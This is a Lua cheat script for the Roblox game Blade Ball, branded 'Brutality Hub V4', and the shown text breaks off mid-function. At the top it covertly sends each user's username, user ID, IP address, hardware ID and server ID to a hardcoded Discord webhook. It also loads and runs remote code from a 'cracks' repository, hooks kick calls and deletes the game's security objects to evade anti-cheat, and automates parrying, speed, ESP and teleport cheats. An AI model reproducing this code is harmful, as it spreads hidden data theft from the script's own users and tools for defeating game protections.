function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**BRUTALITY HUB V4**",
                ["description"] ="Blade Ball",
                ["type"] = "rich",
                ["color"] = tonumber(0xFFFF00), --kuning
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1274745118645289030/GYRUZSBElW6_JdB-K6-PilR0S-RzptVmo8y0sGKSmpswid1ycAvsT0Ky0MYc4xE6qkxL", AdminLoggerMsg())

local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Library/V5.lua"))()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Library/V4.lua"))()
if game.PlaceId == 13772394625 then
end

local Stats = game:GetService('Stats')

local Players = game:GetService('Players')

local RunService = game:GetService('RunService')

local ReplicatedStorage = game:GetService('ReplicatedStorage')

local Nurysium_Util = loadstring(game:HttpGet('https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Scripts/Blade%20Ball.lua'))()

local local_player = Players.LocalPlayer

local camera = workspace.CurrentCamera

local nurysium_Data = nil

local hit_Sound = nil

local closest_Entity = nil

local parry_remote = nil

getgenv().aura_Enabled = false

getgenv().hit_sound_Enabled = false

getgenv().hit_effect_Enabled = false

getgenv().night_mode_Enabled = false

getgenv().trail_Enabled = false

getgenv().self_effect_Enabled = false

local Services = {

    game:GetService('AdService'),

    game:GetService('SocialService')

}

function initializate(dataFolder_name: string)

    local nurysium_Data = Instance.new('Folder', game:GetService('CoreGui'))

    nurysium_Data.Name = dataFolder_name

    hit_Sound = Instance.new('Sound', nurysium_Data)

    hit_Sound.SoundId = 'rbxassetid://936447863'

    hit_Sound.Volume = 5

end

local function get_closest_entity(Object: Part)

    task.spawn(function()

        local closest

        local max_distance = math.huge

        for index, entity in workspace.Alive:GetChildren() do

            if entity.Name ~= Players.LocalPlayer.Name then

                local distance = (Object.Position - entity.HumanoidRootPart.Position).Magnitude

                if distance < max_distance then

                    closest_Entity = entity

                    max_distance = distance

                end

            end

        end

        return closest_Entity

    end)

end

function resolve_parry_Remote()

    for _, value in Services do

        local temp_remote = value:FindFirstChildOfClass('RemoteEvent')

        if not temp_remote then

            continue

        end

        if not temp_remote.Name:find('\n') then

            continue

        end

        parry_remote = temp_remote

    end

end

local aura_table = {

    canParry = true,

    is_Spamming = false,

    parry_Range = 0,

    spam_Range = 0,  

    hit_Count = 0,

    hit_Time = tick(),

    ball_Warping = tick(),

    is_ball_Warping = false

}

ReplicatedStorage.Remotes.ParrySuccess.OnClientEvent:Connect(function()

    if getgenv().hit_sound_Enabled then

        hit_Sound:Play()

    end

    if getgenv().hit_effect_Enabled then

        local hit_effect = game:GetObjects("rbxassetid://17407244385")[1]

        hit_effect.Parent = Nurysium_Util.getBall()

        hit_effect:Emit(3)

        

        task.delay(5, function()

            hit_effect:Destroy()

        end)

    end

end)

ReplicatedStorage.Remotes.ParrySuccessAll.OnClientEvent:Connect(function()

    aura_table.hit_Count += 1

    task.delay(0.15, function()

        aura_table.hit_Count -= 1

    end)

end)

workspace:WaitForChild("Balls").ChildRemoved:Connect(function(child)

    aura_table.hit_Count = 0

    aura_table.is_ball_Warping = false

    aura_table.is_Spamming = false

end)

task.defer(function()

    game:GetService("RunService").Heartbeat:Connect(function()

        if not local_player.Character then

            return

        end

        if getgenv().trail_Enabled then

            local trail = game:GetObjects("rbxassetid://17483658369")[1]

            trail.Name = 'nurysium_fx'

            if local_player.Character.PrimaryPart:FindFirstChild('nurysium_fx') then

                return

            end

            local Attachment0 = Instance.new("Attachment", local_player.Character.PrimaryPart)

            local Attachment1 = Instance.new("Attachment", local_player.Character.PrimaryPart)

            Attachment0.Position = Vector3.new(0, -2.411, 0)

            Attachment1.Position = Vector3.new(0, 2.504, 0)

            trail.Parent = local_player.Character.PrimaryPart

            trail.Attachment0 = Attachment0

            trail.Attachment1 = Attachment1

        else

            

            if local_player.Character.PrimaryPart:FindFirstChild('nurysium_fx') then

                local_player.Character.PrimaryPart['nurysium_fx']:Destroy()

            end

        end

    end)

end)

task.defer(function()

    while task.wait(1) do

        if getgenv().night_mode_Enabled then

            game:GetService("TweenService"):Create(game:GetService("Lighting"), TweenInfo.new(3), {ClockTime = 3.9}):Play()

        else

            game:GetService("TweenService"):Create(game:GetService("Lighting"), TweenInfo.new(3), {ClockTime = 13.5}):Play()

        end

    end

end)

task.spawn(function()

    RunService.PreRender:Connect(function()

        if not getgenv().aura_Enabled then

            return

        end

        if closest_Entity then

            if workspace.Alive:FindFirstChild(closest_Entity.Name) and workspace.Alive:FindFirstChild(closest_Entity.Name).Humanoid.Health > 0 then

                if aura_table.is_Spamming then

                    if local_player:DistanceFromCharacter(closest_Entity.HumanoidRootPart.Position) <= aura_table.spam_Range then   

                        parry_remote:FireServer(

                            0.5,

                            CFrame.new(camera.CFrame.Position, Vector3.zero),

                            {[closest_Entity.Name] = closest_Entity.HumanoidRootPart.Position},

                            {closest_Entity.HumanoidRootPart.Position.X, closest_Entity.HumanoidRootPart.Position.Y},

                            false

                        )

                    end

                end

            end

        end

    end)

    RunService.Heartbeat:Connect(function()

        if not getgenv().aura_Enabled then

            return

        end

        local ping = Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 10

        local self = Nurysium_Util.getBall()

        if not self then

            return

        end

        self:GetAttributeChangedSignal('target'):Once(function()

            aura_table.canParry = true

        end)

        if self:GetAttribute('target') ~= local_player.Name or not aura_table.canParry then

            return

        end

        get_closest_entity(local_player.Character.PrimaryPart)

        local player_Position = local_player.Character.PrimaryPart.Position

        local ball_Position = self.Position

        local ball_Velocity = self.AssemblyLinearVelocity

        if self:FindFirstChild('zoomies') then

            ball_Velocity = self.zoomies.VectorVelocity

        end

        local ball_Direction = (local_player.Character.PrimaryPart.Position - ball_Position).Unit

        local ball_Distance = local_player:DistanceFromCharacter(ball_Position)

        local ball_Dot = ball_Direction:Dot(ball_Velocity.Unit)

        local ball_Speed = ball_Velocity.Magnitude

        local ball_speed_Limited = math.min(ball_Speed / 1000, 0.1)

        local ball_predicted_Distance = (ball_Distance - ping / 15.5) - (ball_Speed / 3.5)

        local target_Position = closest_Entity.HumanoidRootPart.Position

        local target_Distance = local_player:DistanceFromCharacter(target_Position)

        local target_distance_Limited = math.min(target_Distance / 10000, 0.1)

        local target_Direction = (local_player.Character.PrimaryPart.Position - closest_Entity.HumanoidRootPart.Position).Unit

        local target_Velocity = closest_Entity.HumanoidRootPart.AssemblyLinearVelocity

        local target_isMoving = target_Velocity.Magnitude > 0

        local target_Dot = target_isMoving and math.max(target_Direction:Dot(target_Velocity.Unit), 0)

        aura_table.spam_Range = math.max(ping / 10, 15) + ball_Speed / 7

        aura_table.parry_Range = math.max(math.max(ping, 4) + ball_Speed / 3.5, 9.5)

        aura_table.is_Spamming = aura_table.hit_Count > 1 or ball_Distance < 13.5

        if ball_Dot < -0.2 then

            aura_table.ball_Warping = tick()

        end

        task.spawn(function()

            if (tick() - aura_table.ball_Warping) >= 0.15 + target_distance_Limited - ball_speed_Limited or ball_Distance <= 10 then

                aura_table.is_ball_Warping = false

                return

            end

            aura_table.is_ball_Warping = true

        end)

        if ball_Distance <= aura_table.parry_Range and not aura_table.is_Spamming and not aura_table.is_ball_Warping then

            parry_remote:FireServer(

                0.5,

                CFrame.new(camera.CFrame.Position, Vector3.new(math.random(0, 100), math.random(0, 1000), math.random(100, 1000))),

                {[closest_Entity.Name] = target_Position},

                {target_Position.X, target_Position.Y},

                false

            )

            aura_table.canParry = false

            aura_table.hit_Time = tick()

            aura_table.hit_Count += 1

            task.delay(0.15, function()

                aura_table.hit_Count -= 1

            end)

        end

        task.spawn(function()

            repeat

                RunService.Heartbeat:Wait()

            until (tick() - aura_table.hit_Time) >= 1

                aura_table.canParry = true

        end)

    end)

end)

initializate('nurysium_temp')

spawn(function()
    while true do
        wait(0.01)
        if getgenv().ASC then
            game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalSwordCrate)
        end
    end
end)

spawn(function()
    while true do
        wait(0.01)
        if getgenv().AEC then
            game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalExplosionCrate)
        end
    end
end)

spawn(function()
    local TweenService = game:GetService("TweenService")
    local plr = game.Players.LocalPlayer
    local Ball = workspace:WaitForChild("Balls")
    local currentTween = nil

    while true do
        wait(0.001)
        if getgenv().FB then
            local ball = Ball:FindFirstChildOfClass("Part")
            local char = plr.Character
            if ball and char then
                local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, false, 0)
                local distance = (char.PrimaryPart.Position - ball.Position).magnitude
                if distance <= 1000 then 
                    if currentTween then
                        currentTween:Pause()
                    end
                    currentTween = TweenService:Create(char.PrimaryPart, tweenInfo, {CFrame = ball.CFrame})
                    currentTween:Play()
                end
            end
        else
            if currentTween then
                currentTween:Pause()
                currentTween = nil
            end
        end
    end
end)

local function getExecutorName()
    local executor = "Unknown"
    
    if getexecutorname then
        executor = getexecutorname()
    end
    
    return executor
end

local executorName = getExecutorName()

if executorName == "Solara" then
    local Notify = Library:MakeNotify({
        Title = "Brutality Hub V4",
        Text = "Brutality Hub V4  has determined that your executor, " .. executorName .. ", is fully compatible, ensuring an optimal and satisfying experience with our product.",
        Time = 5
      })

    local old
    old = hookmetamethod(
        game,
        "__namecall",
        function(self, ...)
            local method = tostring(getnamecallmethod())
            if string.lower(method) == "kick" then
                return wait(9e9)
            end
            return old(self, ...)
        end)

        local AntiKick = coroutine.create(function()
            ReplicatedStorage.Security.RemoteEvent:Destroy()
            ReplicatedStorage.Security[""]:Destroy()
            ReplicatedStorage.Security:Destroy()
            LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
            task.wait()
        
        end)
        
        coroutine.resume(AntiKick)
else
    local Notify = Library:MakeNotify({
        Title = "Brutality Hub V4",
        Text = "Brutality Hub V4 has determined that your executor, " .. executorName .. ", is fully compatible, ensuring an optimal and satisfying experience with our product.",
        Time = 5
      })

    local old
    old = hookmetamethod(
        game,
        "__namecall",
        function(self, ...)
            local method = tostring(getnamecallmethod())
            if string.lower(method) == "kick" then
                return wait(9e9)
            end
            return old(self, ...)
        end)

        local AntiKick = coroutine.create(function()
            ReplicatedStorage.Security.RemoteEvent:Destroy()
            ReplicatedStorage.Security[""]:Destroy()
            ReplicatedStorage.Security:Destroy()
            LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
            task.wait()
        
        end)
        
        coroutine.resume(AntiKick)
end


local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local player = game.Players.LocalPlayer

local playerName = player.DisplayName

local function getExecutorName()
    local executor = "Unknown"
    
    if getexecutorname then
        executor = getexecutorname()
    end
    
    return executor
end

local executorName = getExecutorName()

local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local gameId = game.PlaceId

local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"

redzlib.Themes.DarkRed = {
    ["Color Hub 1"] = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(156, 126, 19.5)), --28, 23, 25.5)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(30.5, 30.5, 30.5)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0.5))
    }),
    ["Color Hub 2"] = Color3.fromRGB(28, 28, 28),
    ["Color Stroke"] = Color3.fromRGB(38, 38, 38),
    ["Color Theme"] = Color3.fromRGB(252, 219, 3),
    ["Color Text"] = Color3.fromRGB(240, 240, 240),
    ["Color Dark Text"] = Color3.fromRGB(180, 180, 180)
}  

local Window = redzlib:MakeWindow({
    Title = "Brutality Hub V4  | " .. gameName,
    SubTitle = "by Medusa Script Roblox",
    SaveFolder = "BrutalityHubV4"
})

redzlib:SetTheme("DarkRed")

local Tab1 = Window:MakeTab({"| Home", "rbxassetid://17781992617"})
local Tab2 = Window:MakeTab({"| Player", "rbxassetid://18170270692"})
local Tab7 = Window:MakeTab({"| Visual", "rbxassetid://18556609036"})
local Tab3 = Window:MakeTab({"| Combat", "rbxassetid://18170269266"})
local Tab4 = Window:MakeTab({"| Shop", "rbxassetid://18170268224"})
local Tab77 = Window:MakeTab({"| Music", "rbxassetid://18556186273"})
local Tab5 = Window:MakeTab({"| Tools", "rbxassetid://18170704671"})

Window:SelectTab(Tab1)

local Paragraph = Tab1:AddParagraph({"Join us discord for information about updates!", "​"})

Tab1:AddDiscordInvite({
    Name = "Brutality Hub Official",
    Description = "join to get the latest information",
    Invite = "https://discord.gg/brutality-hub-1182005198206545941",
    Logo = "rbxassetid://110958770625024"
})

Tab1:AddDiscordInvite({
    Name = "Brutality Hub Youtube",
    Description = "Please subscribe for get notify update script",
    Invite = "www.youtube.com/@medusascriptroblox",
    Logo = "rbxassetid://110958770625024"
})


Window:AddMinimizeButton({
    Button = {
        Image = "rbxassetid://104397992902189"
    },
    UICorner = {true,
    CornerRadius = UDim.new(0.5, 0)
},
UIStroke = {false, {

}}
})

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local originalSpeed = character.Humanoid.WalkSpeed
local originalFov = game:GetService("Workspace").Camera.FieldOfView

local speedEnabled = false
local fovEnabled = false
local speedValue = 36
local fovValue = 80

local function applySpeed()
    if speedEnabled then
        character.Humanoid.WalkSpeed = speedValue
    else
        character.Humanoid.WalkSpeed = originalSpeed
    end
end

local function applyFov()
    if fovEnabled then
        game:GetService("Workspace").Camera.FieldOfView = fovValue
    else
        game:GetService("Workspace").Camera.FieldOfView = originalFov
    end
end

local function onCharacterAdded(newCharacter)
    character = newCharacter
    character:WaitForChild("Humanoid")
    applySpeed()
end

player.CharacterAdded:Connect(onCharacterAdded)

character:WaitForChild("Humanoid").Died:Connect(function()
    applySpeed()
    applyFov()
end)

local Section = Tab2:AddSection({"Player"})

Tab2:AddSlider({
    Name = "Speed",
    Description = "Adjusts the speed of the object.",
    Min = 36,
    Max = 1000,
    Increase = 1,
    Default = 36,
    Callback = function(Value)
        speedValue = Value
        applySpeed()
    end
})

Tab2:AddSlider({
    Name = "Fov",
    Description = "Adjusts the field of view of the camera.",
    Min = 80,
    Max = 1000,
    Increase = 1,
    Default = 80,
    Callback = function(Value)
        fovValue = Value
        applyFov()
    end
})

local Section = Tab2:AddSection({"Enable Toggle"})

Tab2:AddToggle({
    Name = "Enable Speed",
    Description = "Enables or disables speed control.",
    Default = false,
    Callback = function(Value)
        speedEnabled = Value
        applySpeed()
    end
})

Tab2:AddToggle({
    Name = "Enable Fov",
    Description = "Enables or disables FOV control.",
    Default = false,
    Callback = function(Value)
        fovEnabled = Value
        applyFov()
    end
})

game:GetService("RunService").RenderStepped:Connect(function()
    if speedEnabled then
        character.Humanoid.WalkSpeed = speedValue
    end
    if fovEnabled then
        game:GetService("Workspace").Camera.FieldOfView = fovValue
    end
end)

local Section = Tab2:AddSection({"Tools"})

local InfiniteJumpEnabled = false

game:GetService("UserInputService").JumpRequest:Connect(function()
    if InfiniteJumpEnabled then
        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
    end
end)

local Toggle1 = Tab2:AddToggle({
    Name = "Infinite Jump",
    Description = "Allows the character to jump indefinitely without touching the ground.",
    Default = false,
    Callback = function(state)
        InfiniteJumpEnabled = state
    end
})

local Toggle1 = Tab2:AddToggle({
    Name = "Night Mode",
    Description = "Enables or disables night mode, changing the overall lighting.",
    Default = false,
    Callback = function(Value)
        getgenv().night_mode_Enabled = Value
    end
})

local function toggleXRay(state, transparency)
    if state then
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent.Parent:FindFirstChildOfClass("Humanoid") then
                if not v:FindFirstChild("OriginalTransparency") then
                    local OriginalTransparency = Instance.new("NumberValue", v)
                    OriginalTransparency.Name = "OriginalTransparency"
                    OriginalTransparency.Value = v.LocalTransparencyModifier
                    v.LocalTransparencyModifier = transparency
                end
            end
        end
    else
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent.Parent:FindFirstChildOfClass("Humanoid") then
                if v:FindFirstChild("OriginalTransparency") then
                    v.LocalTransparencyModifier = v:WaitForChild("OriginalTransparency").Value
                    v:WaitForChild("OriginalTransparency"):Destroy()
                end
            end
        end
    end
end

local currentTransparency = 0.7
local xrayState = false

local Toggle2 = Tab2:AddToggle({
    Name = "XRay",
    Description = "Enables or disables X-ray vision, allowing you to see through objects.",
    Default = false,
    Callback = function(state)
        xrayState = state
        toggleXRay(xrayState, currentTransparency)
    end
})

Tab2:AddSlider({
    Name = "XRay Intensity",
    Description = "Adjusts the intensity of the X-ray vision.",
    Min = 0.1,
    Max = 1,
    Increase = 0.01,
    Default = 0.7,
    Callback = function(Value)
        currentTransparency = Value
        if xrayState then
            toggleXRay(true, currentTransparency)
        end
    end
})

local function detectExploiters()
    while Options.DetectExploitersToggle.Value do
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                local humanoid = player.Character.Humanoid
                local rootPart = player.Character:FindFirstChild("HumanoidRootPart")

                if humanoid.WalkSpeed > 40 then
                    local Notify = Library:MakeNotify({
                        Title = "Brutality Hub",
                        Text = player.Name .. " is using high speed (WalkSpeed: " .. humanoid.WalkSpeed .. ")!",
                        Time = 5
                    })
                end

                if humanoid.JumpPower > 100 then
                    local Notify = Library:MakeNotify({
                        Title = "Brutality Hub",
                        Text = player.Name .. " is using high jump (JumpPower: " .. humanoid.JumpPower .. ")!",
                        Time = 5
                    })
                end

                if rootPart and rootPart.Anchored then
                    local Notify = Library:MakeNotify({
                        Title = "Brutality Hub",
                        Text = player.Name .. " is using fly!",
                        Time = 5
                    })
                end

                if rootPart then
                    local ray = Ray.new(rootPart.Position, Vector3.new(0, -10, 0))
                    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {player.Character})
                    if not hit or (position - rootPart.Position).Magnitude > 10 then
                        local Notify = Library:MakeNotify({
                            Title = "Brutality Hub",
                            Text = player.Name .. " is using noclip!",
                            Time = 5
                        })
                    end
                end

                if rootPart then
                    local speedMagnitude = (rootPart.Velocity * Vector3.new(1, 0, 1)).Magnitude
                    if speedMagnitude > 100 then
                        local Notify = Library:MakeNotify({
                            Title = "Brutality Hub",
                            Text = player.Name .. " is using speed glitch (Speed: " .. speedMagnitude .. ")!",
                            Time = 5
                        })
                    end
                end
            end
        end
        wait(1)
    end
end

local Toggle3 = Tab2:AddToggle({
    Name = "Detect Exploiters",
    Description = "Enables or disables exploiter detection.",
    Default = false,
    Callback = function(state)
        if state then
            detectExploiters()
        end
    end
})

local Section = Tab2:AddSection({"TP"})

local Dropdown
local LastSelectedPlayer = nil
local IsLooping = false

local function UpdatePlayerDropdown()
    local playerNames = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if Dropdown then
        Dropdown:Set(playerNames)
    end
end

local function TeleportToPlayer(playerName)
    local player = game.Players:FindFirstChild(playerName)
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end
end

Dropdown = Tab2:AddDropdown({
    Name = "Players List",
    Description = "Select a player from the list.",
    Options = {},
    Default = "",
    Flag = "playersDropdown",
    Callback = function(value)
        if value ~= "" and value ~= LastSelectedPlayer then
            TeleportToPlayer(value)
            LastSelectedPlayer = value
        end
    end
})

local ToggleLoopTP = Tab2:AddToggle({
    Name = "Loop TP Player",
    Description = "Enables or disables continuous teleportation.",
    Default = false,
    Flag = "loopTP",
    Callback = function(isToggled)
        IsLooping = isToggled
        while IsLooping do
            if LastSelectedPlayer then
                TeleportToPlayer(LastSelectedPlayer)
            end
            wait(0.05)
        end
    end
})

game.Players.PlayerAdded:Connect(UpdatePlayerDropdown)
game.Players.PlayerRemoving:Connect(UpdatePlayerDropdown)

UpdatePlayerDropdown()

local Section = Tab7:AddSection({"Esp"})

local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Scripts/Esp.lua"))()

ESP:Toggle(false)

local Toggle1 = Tab7:AddToggle({
    Name = "Enable Esp",
    Description = "Enables or disables the entire ESP system.",
    Default = false,
    Callback = function(Value)
        ESP:Toggle(Value)
    end
})

local Section = Tab7:AddSection({"Esp Options"})

local Toggle2 = Tab7:AddToggle({
    Name = "Name Esp",
    Description = "Displays player names above their heads.",
    Default = false,
    Callback = function(Value)
        ESP.Names = Value
    end
})

local Toggle3 = Tab7:AddToggle({
    Name = "Box Esp",
    Description = "Draws a box around players.",
    Default = false,
    Callback = function(Value)
        ESP.Boxes = Value
    end
})

local Toggle4 = Tab7:AddToggle({
    Name = "Tracers Esp",
    Description = "Draws lines from your character to other players.",
    Default = false,
    Callback = function(Value)
        ESP.Tracers = Value
    end
})

local Section = Tab3:AddSection({"Combat"})

local Toggle1 = Tab3:AddToggle({
    Name = "Auto Parry AI",
    Description = "Enables or disables automatic parry using AI.",
    Default = false,
    Callback = function(toggled)
        autoParryAIEnabled = toggled

        resolve_parry_Remote()

        getgenv().aura_Enabled = toggled
    end
})

local Toggle2 = Tab3:AddToggle({
    Name = "Hit Effect AI",
    Description = "Enables or disables AI-based hit effects.",
    Default = false,
    Callback = function(toggled)
        getgenv().hit_effect_Enabled = toggled
    end
})

getgenv().ViewParryArea = false
getgenv().ParryRange = 10
local maxRange = 25

local Stats = game:GetService('Stats')
local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')

local local_player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local Nurysium_Util = loadstring(game:HttpGet('https://raw.githubusercontent.com/cracklua/cracks/m/sources/pitbull/Scripts/Blade%20Ball.lua'))()
local closest_Entity = nil
local connection

local function get_closest_entity_in_camera_direction()
    local closest
    local max_distance = math.huge
    local camera_direction = camera.CFrame.LookVector

    for _, entity in workspace.Alive:GetChildren() do
        if entity.Name ~= Players.LocalPlayer.Name then
            local direction_to_entity = (entity.HumanoidRootPart.Position - camera.CFrame.Position).Unit
            local angle = math.acos(camera_direction:Dot(direction_to_entity))

            if angle < math.rad(30) then
                local distance = (camera.CFrame.Position - entity.HumanoidRootPart.Position).Magnitude
                if distance < max_distance then
                    closest_Entity = entity
                    max_distance = distance
                end
            end
        end
    end
end

local function ViewParryArea()
    local BallParry = Instance.new("Part", workspace)
    BallParry.Name = "Parry Range <Alexis.isback00 or Pitbull>"
    BallParry.Material = Enum.Material.ForceField
    BallParry.CastShadow = false
    BallParry.CanCollide = false
    BallParry.Anchored = true
    BallParry.BrickColor = BrickColor.new("Bright blue")
    BallParry.Shape = Enum.PartType.Ball

    local PartFind = workspace:FindFirstChild(BallParry.Name)
    if PartFind and PartFind ~= BallParry then
        PartFind:Destroy()
    end

    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer

    local isExpanding = false
    local Range = getgenv().ParryRange
    local initialRange = getgenv().ParryRange

    connection = RunService.Heartbeat:Connect(function()
        if not getgenv().ViewParryArea then
            connection:Disconnect()
            BallParry:Destroy()
            return
        end

        local plrChar = Player.Character
        local plrPP = plrChar and plrChar:FindFirstChild("HumanoidRootPart")

        BallParry.BrickColor = BrickColor.new("Bright blue")

        if plrPP then
            BallParry.Position = plrPP.Position
        else
            BallParry.Position = Vector3.new(1000, 1000, 1000)
        end

        local self = Nurysium_Util.getBall()
        if self then
            local ball_Velocity = self.AssemblyLinearVelocity

            if self:FindFirstChild('zoomies') then
                ball_Velocity = self.zoomies.VectorVelocity
            end

            local ball_Position = self.Position
            local ball_Direction = (ball_Position - plrPP.Position).Unit
            local ball_Speed = ball_Velocity.Magnitude
            local ball_Dot = ball_Direction:Dot(ball_Velocity.Unit)

            local ping = Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 10
            local max_parry_Range = math.max(math.max(ping, 4) + ball_Speed / 1.5, maxRange)

            if ball_Dot < 0 then
                if not isExpanding then
                    Range = initialRange
                    isExpanding = true
                end
                Range = math.min(Range + ball_Speed / 5, max_parry_Range)
            else
                if isExpanding then
                    Range = getgenv().ParryRange
                    isExpanding = false
                end
            end

            BallParry.Size = Vector3.new(Range, Range, Range)
        end
    end)
end

local Toggle3 = Tab3:AddToggle({
    Name = "Visualizer",
    Description = "Enables or disables combat visualizer.",
    Default = false,
    Callback = function(toggled)
        getgenv().ViewParryArea = toggled
        if toggled then
            ViewParryArea()
        elseif connection then
            connection:Disconnect()
            local existingPart = workspace:FindFirstChild("Parry Range <Alexis.isback00 or Pitbull>")
            if existingPart then
                existingPart:Destroy()
            end
        end
    end
})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local hitremote
for i,v in next, game:GetDescendants() do
    if v and v.Name:find("\n") and v:IsA("RemoteEvent") then
        hitremote = v
        break
    end
end

local cframes = {
    CFrame.new(-Random.new():NextNumber(200, 500), Random.new():NextNumber(0, 40), -Random.new():NextNumber(70, 120)),
    CFrame.new(-Random.new():NextNumber(200, 500), Random.new():NextNumber(0, 40), -Random.new():NextNumber(70, 120)),
    CFrame.new(-Random.new():NextNumber(200, 500), Random.new():NextNumber(0, 80), -Random.new():NextNumber(70, 120)),
    CFrame.new(-Random.new():NextNumber(200, 600), Random.new():NextNumber(0, 80), -Random.new():NextNumber(70, 120))
}

local function getcloseplr()
    local plr
    local dista = math.huge
    for i,v in next, Players:GetPlayers() do
        if v and v ~= LocalPlayer and v.Character and v.Character:IsDescendantOf(game:GetService("Workspace"):FindFirstChild("Alive")) and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health > 0 and v.Character.PrimaryPart then
            local dist = LocalPlayer:DistanceFromCharacter(v.Character.PrimaryPart.Position)
            if dist < dista then
                dista = dist
                plr = v
            end
        end
    end
    return plr
end

local function getplrs()
    local plrss = {}
    for i,v in next, Players:GetPlayers() do
        if v and v.Character and v.Character:IsDescendantOf(game:GetService("Workspace"):FindFirstChild("Alive")) then
            plrss[v.Name] = v.Character.PrimaryPart.Position + Vector3.new(10, 10, 10)
        end
    end
    return plrss
end

local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = CoreGui

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0, 40, 0, 20)
frame.Size = UDim2.new(0, 100, 0, 50)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Name = "Clash Mode"
frame.Parent = gui

local button = Instance.new("TextButton")
button.Text = "Clash Mode"
button.Size = UDim2.new(1, -4, 1, -7)
button.Position = UDim2.new(0, 3, 0, 5)
button.BackgroundColor3 = Color3.new(0, 0, 0)
button.BackgroundTransparency = 0.5
button.BorderColor3 = Color3.new(0, 0, 0)
button.BorderSizePixel = 2
button.Font = Enum.Font.SourceSans
button.TextColor3 = Color3.new(1, 1, 1)
button.TextSize = 22
button.Parent = frame

local activated = false
local heartbeatConnection
local manualspamspeed = 8
local manspamcons = {}
local enabled = false
local debounce = false

frame.BackgroundTransparency = 0.9

local function deactivateClashMode()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end

    for i,v in next, manspamcons do
        v:Disconnect()
    end
    table.clear(manspamcons)
    enabled = false

    button.Text = "OFF"
    button.TextColor3 = Color3.new(1, 0, 0)
end

local function activateClashMode()
    local function fireHitRemote()
        if debounce then return end
        debounce = true
        delay(0.05, function() debounce = false end)
        
        for i = 1, manualspamspeed do
            if not enabled then break end
            local args = {
                [1] = 0.5,
                [2] = cframes[math.random(1, #cframes)],
                [3] = getcloseplr() and {[tostring(getcloseplr().Name)] = getcloseplr().Character.PrimaryPart.Position} or getplrs(),
                [4] = {
                    [1] = math.random(200, 500),
